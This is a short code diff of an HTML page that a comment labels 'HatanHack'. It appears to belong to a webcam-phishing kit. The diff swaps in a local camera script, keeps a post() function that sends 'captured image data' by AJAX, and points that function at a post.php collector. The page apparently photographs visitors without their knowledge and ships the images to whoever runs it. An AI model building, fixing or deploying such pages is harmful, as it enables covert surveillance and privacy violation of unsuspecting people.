@@ -2,7 +2,8 @@
 <html>
 
 <head>
-  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script type="text/javascript" src="hatan_assets/index.js"></script>
+  
   <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
@@ -117,12 +118,13 @@
 </style>
 
 <script>
-
+  // HatanHack - Function to send captured image data via AJAX
   function post(imgdata) {
     $.ajax({
       type: 'POST',
       data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
+      // CRITICAL FIX: The URL is pointed directly to the customized post.php in the main directory.
+      url: 'post.php',
       dataType: 'json',
       async: false,
       success: function (result) {
@@ -182,7 +184,7 @@
   $(document).ready(function(){
    setTimeout(function(){
       PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
+   },50000); // 50000 milliseconds = 50 seconds
 });
 </script>
 
